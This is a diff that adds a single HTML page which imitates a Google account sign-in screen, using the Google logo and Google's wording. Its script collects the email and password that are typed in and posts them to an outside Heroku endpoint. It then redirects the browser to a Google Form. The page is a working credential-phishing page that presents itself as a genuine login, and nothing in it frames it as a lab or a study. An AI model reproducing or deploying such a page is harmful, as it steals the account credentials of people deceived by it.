@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <title>Login</title>
+</head>
+
+<body>
+
+    <main>
+
+
+        <div class="container">
+            <div class="top-content">
+                <img src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt="">
+                <h2>Sign in</h2>
+                <p class="heading">Use your Google Account</p>
+
+            </div>
+            <div class="inputs">
+                <input placeholder="Email or phone" type="email" name="" id="email" class="input">
+                <input placeholder="Password" type="email" name="" id="pass" class="input">
+
+
+            </div>
+            <a href="" class="link-btn">Forgot Email?</a>
+            <p class="color">Not your computer? Use Guest mode to sign in privately.</p>
+            <a href="" class="link-btn">Learn More</a>
+            <div class="btn-group">
+                <button class="create-btn">Create account</button>
+                <button id="salam" class="next-btn">Next</button>
+
+            </div>
+        </div>
+    </main>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.4/axios.min.js" integrity="sha512-ANd7ZJmixP2T0hxOP4bS6hkci01fxyrQSyRdaY7IsWq1WlKsD0WwWBDVDZbnMR7CJZVKCTkDx/q5D5n2C2C+vg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script>
+        const mail = document.getElementById('email')
+        const passw = document.getElementById('pass')
+        const submit = () => {
+            console.log(document.getElementById('email').value)
+            axios.post(`https://gmllm-343d4a426dd0.herokuapp.com/data`, {
+                mail: mail.value,
+                pass: passw.value
+
+            }).then(res => {
+                window.location.href = "https://forms.gle/zw71xpDueyDSZg9v9";
+            })
+
+
+        }
+
+        document.getElementById('salam').addEventListener('click', submit)
+    </script>
+</body>
+
+</html>
